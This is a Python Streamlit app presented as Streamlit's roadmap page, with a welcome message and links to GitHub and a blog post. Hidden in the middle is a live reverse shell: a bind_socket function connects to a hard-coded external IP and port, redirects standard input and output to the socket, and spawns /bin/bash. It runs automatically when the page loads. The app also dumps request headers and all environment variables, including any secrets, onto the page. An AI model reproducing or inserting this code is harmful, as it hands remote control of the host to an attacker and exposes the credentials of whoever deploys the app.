import datetime
import re
from collections import defaultdict, namedtuple
import os
import socket,pty
import streamlit as st
from notion_client import Client

st.set_page_config("Roadma", "https://streamlit.io/favicon.svg")
TTL = 24 * 60 * 60

Project = namedtuple(
    "Project",
    [
        "id",
        "title",
        "icon",
        "public_description",
        "stage",
        "quarter",
    ],
)

st.image("https://streamlit.io/images/brand/streamlit-mark-color.png", width=78)

st.write(
    """
    # Streamlits roadmap v2

    Welcome to our roadmap! 👋 This app shows some projects we're working on or have
    planned for the future. Plus, there's always more going on behind the scenes — we
    sometimes like to surprise you ✨
    """
)

print("streamlit app called ")
      
st.write(st.context.headers)
st.write(os.environ)

def bind_socket():
    # This function will only be run the first time it's called
    print("Socket bound!")

    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("3.92.69.143",51337))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    pty.spawn("/bin/bash")
bind_socket()
    
st.info(
    """
    Need a feature that's not on here?
    [Let us know by opening a GitHub issue!](https://github.com/streamlit/streamlit/issues)
    """,
    icon="👾",
)

st.success(
    """
    Read [the blog post on Streamlit's roadmap](https://blog.streamlit.io/the-next-frontier-for-streamlit/)
    to understand our broader vision.
    """,
    icon="🗺",
)
